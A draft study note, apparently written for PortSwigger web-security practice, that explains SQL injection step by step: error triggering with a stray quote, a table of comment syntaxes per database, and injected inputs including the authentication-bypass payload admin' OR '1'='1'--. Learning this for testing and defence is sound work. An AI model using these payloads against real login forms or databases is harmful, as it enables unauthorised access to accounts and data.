---
title: SQL Injection
draft: true
tags:
  - PortSwigger
  - Web
  - SQLINJECTION
---

# SQL Injection

## Background

To successfully perform SQL injection, you must first understand the backend process. Let's think like a backend developer:

The developer takes user input and incorporates it directly into SQL queries like this:

```sql
SELECT * FROM users WHERE username = 'variable'
```

## Step 1: Trigger Error Messages

The first step in testing for SQL injection vulnerabilities is to generate error messages that reveal database information.

> [!WARNING]
> In SQL, you can use either single quotes (`'`) or double quotes (`"`) for string literals

**Example Error Trigger:**
```sql
SELECT * FROM users WHERE username = '''
```
This creates a syntax error by closing the quote prematurely.

## Step 2: Fixing the Syntax Error

After generating an error, you need to properly close the statement to execute your injected code using comments:

### SQL Comment Types Reference

| Comment Type | Syntax | Supported Databases |
|--------------|--------|---------------------|
| Single-line | `--` | All major databases |
| URL-encoded single-line | `--+` / `--%0A` | URL contexts |
| MySQL single-line | `#` | MySQL |
| Block comment | `/* comment */` | All |
| Empty block comment | `/**/` | MySQL, PostgreSQL, SQL Server |
| Nested comment | `/* /* */ */` | Oracle |
| MySQL versioned | `/*! code */` | MySQL |
| MySQL optimizer | `/*!50000 code */` | MySQL |

## Step 3: SQL Injection

Now you're ready to inject SQL code:

**Original Backend Code:**
```sql
SELECT * FROM users WHERE username = 'variable'
```

**Injection Example:**
```sql
-- What you inject:
variable'/* YOUR SQL CODE HERE */--

-- Resulting query:
SELECT * FROM users WHERE username = 'variable'/* YOUR SQL CODE HERE */--'
```

**Practical Injection:**
```sql
-- Example: Bypass authentication
admin' OR '1'='1'--

-- Resulting query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--'
```